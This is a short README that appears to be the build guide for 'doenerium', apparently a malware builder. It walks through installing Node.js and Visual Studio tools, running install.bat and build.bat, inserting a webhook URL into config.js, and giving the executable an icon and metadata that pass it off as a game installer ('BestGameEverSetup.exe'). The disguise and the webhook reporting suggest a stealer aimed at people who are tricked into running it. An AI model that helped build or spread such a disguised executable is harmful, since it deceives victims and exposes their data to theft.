## üìÅ Setup // Requirements

Install [Node.js](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi) `IMPORTANT: Install NodeJS version 18.15.0`
 
***VERY IMPORTANT***: When installing Node.js also install **"Tools for Native Modules"** => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`

To avoid any circumstances. Please also install [the latest version of Visual Studio](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030) including the `"Desktop development with C++" workload."`.

**Note:** When installing Visual Studio with the **"Desktop development with C++"** workload make sure to also install `MSVC v141 - VS 2017 C++ x64/x86 build  tools`

Then run the **_install.bat_** file to install all necessary packages

If you are getting errors: Try running the **_fix.bat_** file to automatically fix common issues.

Replace _REPLACE_ME_ with your webhook url in **_config.js_**

Replace the **"default.ico"** file with the icon you would like to have on your executable. 
``The filetype must be ".ico"! and the icon should be 256x256 OR 128x128 but 256x256 works the best`` 

Lastly add a File Description, ProductName, LegalCopyright & OriginalFilename in ``config.js`` 

An example would be:
```
properties: {
    FileDescription: 'Best Game ever',
    ProductName: 'Best Game ever',
    LegalCopyright: 'Best Game ever ¬©Ô∏è 2023',
    OriginalFilename: 'BestGameEverSetup.exe'
}

```

Run **_build.bat_** and wait for a file with a similar name to **_doenerium_8AnBqvBG.exe_** to be built.
